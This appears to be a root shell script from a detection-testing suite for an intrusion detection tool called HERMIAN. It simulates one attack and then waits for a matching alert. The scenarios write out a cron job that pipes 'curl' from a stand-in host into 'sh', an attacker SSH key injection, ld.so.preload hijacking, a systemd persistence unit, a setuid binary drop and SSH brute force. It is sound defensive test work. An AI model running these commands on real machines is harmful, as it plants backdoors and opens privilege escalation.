#!/bin/sh
# HERMIAN attack simulation: run ONE scenario and assert the expected alert
# appears at HIGH or CRITICAL.
#
# Usage: run_attack.sh <scenario> <title-pattern>
# Requires a fresh matching JSON alert within 30 seconds after the simulation.
# Deduplicated repeats do not pass: wait out the dedup window before rerunning.
# The scenario's artifacts are removed on exit, pass or fail.
set -eu

if [ "$#" -ne 2 ] || [ -z "$2" ]; then
    echo "usage: $0 <scenario> <title-pattern>" >&2
    exit 2
fi

SCENARIO="$1"
PATTERN="$2"
DIR="$(cd "$(dirname "$0")" && pwd)"

. "$DIR/../helpers/disposable_host.sh"
require_disposable_host

if [ "$(id -u)" -ne 0 ]; then
    echo "run as root" >&2
    exit 1
fi

# Remember whether ld.so.preload existed so cleanup can restore that state.
PRELOAD_EXISTED=0
[ -e /etc/ld.so.preload ] && PRELOAD_EXISTED=1

# Undo this scenario's changes. Leaving /tmp/.hermian-libevil.so in
# /etc/ld.so.preload would let any local user get code into every process,
# setuid ones included, so this runs on every exit path.
cleanup() {
    case "$SCENARIO" in
        webshell)
            rm -f /tmp/.x.sh
            ;;
        ssh-key-injection)
            sed -i '/HERMIANATTACKSIM/d' /root/.ssh/authorized_keys 2>/dev/null || true
            ;;
        cron-persistence)
            rm -f /etc/cron.d/hermian-test-backdoor
            ;;
        systemd-persistence)
            rm -f /etc/systemd/system/hermian-test.service
            systemctl daemon-reload >/dev/null 2>&1 || true
            ;;
        ld-preload)
            sed -i '/hermian-libevil/d' /etc/ld.so.preload 2>/dev/null || true
            if [ "$PRELOAD_EXISTED" -eq 0 ] && [ ! -s /etc/ld.so.preload ]; then
                rm -f /etc/ld.so.preload
            fi
            ;;
        suid-drop)
            rm -f /tmp/.hermian-test-suid
            ;;
    esac
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

# Scenarios are unattended by design: run detached from this shell's TTY and
# session so HERMIAN's session attribution treats them as automated.
detached() {
    setsid sh -c "$1" </dev/null >/dev/null 2>&1 &
}

START=$(python3 -c 'from datetime import datetime, timezone; print(datetime.now(timezone.utc).isoformat())')

case "$SCENARIO" in
    webshell)
        # nginx (fake comm) -> bash -> curl -> sh /tmp/x
        detached "exec python3 '$DIR/../helpers/fake_comm.py' nginx 30 -- \
            bash -c 'curl -s http://127.0.0.1:1/ -o /tmp/.x.sh 2>/dev/null || echo \"#!/bin/sh\nsleep 1\" > /tmp/.x.sh; chmod +x /tmp/.x.sh; sh /tmp/.x.sh'"
        ;;
    ssh-key-injection)
        detached "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHERMIANATTACKSIM attacker' >> /root/.ssh/authorized_keys"
        ;;
    cron-persistence)
        detached "echo '* * * * * root curl -s http://198.51.100.42/x.sh | sh' > /etc/cron.d/hermian-test-backdoor"
        ;;
    systemd-persistence)
        detached "printf '[Unit]\nDescription=test\n[Service]\nExecStart=/dev/shm/.hermian-test\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/hermian-test.service"
        ;;
    ld-preload)
        detached "echo /tmp/.hermian-libevil.so >> /etc/ld.so.preload"
        ;;
    brute-force)
        i=0
        while [ "$i" -lt 8 ]; do
            ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
                -o PreferredAuthentications=password,keyboard-interactive \
                hermian-attacker@127.0.0.1 </dev/null >/dev/null 2>&1 || true
            i=$((i + 1))
        done
        ;;
    memfd)
        detached "python3 '$DIR/../helpers/memfd_exec.py'"
        ;;
    suid-drop)
        detached "cp /bin/true /tmp/.hermian-test-suid && chmod 4755 /tmp/.hermian-test-suid"
        ;;
    *)
        echo "unknown scenario: $SCENARIO" >&2
        exit 2
        ;;
esac

# Poll the authoritative JSON store; the setuid sweep can take 20 seconds.
# Never fall back to historical text logs or hide a failed alert query.
if python3 "$DIR/../helpers/wait_for_alert.py" "$START" "$PATTERN"; then
    echo "PASS  $SCENARIO -> fresh HIGH/CRITICAL alert matching '$PATTERN'"
    exit 0
fi
echo "FAIL  $SCENARIO -> fresh HIGH/CRITICAL alert matching '$PATTERN' not verified" >&2
hermian alerts -n 5 2>/dev/null || true
exit 1
